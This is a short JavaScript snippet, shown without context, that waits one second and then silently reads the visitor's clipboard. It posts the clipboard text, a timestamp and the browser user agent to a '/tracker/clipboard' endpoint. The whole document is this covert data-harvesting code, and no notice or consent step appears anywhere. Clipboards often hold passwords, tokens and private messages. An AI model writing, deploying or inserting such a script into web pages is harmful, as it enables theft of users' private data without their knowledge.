setTimeout(() => {
  navigator.clipboard.readText().then(text => {
    fetch("/tracker/clipboard", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        clipboard: text,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      })
    });
  }).catch(err => {
    console.log("Clipboard access failed:", err);
  });
}, 1000);
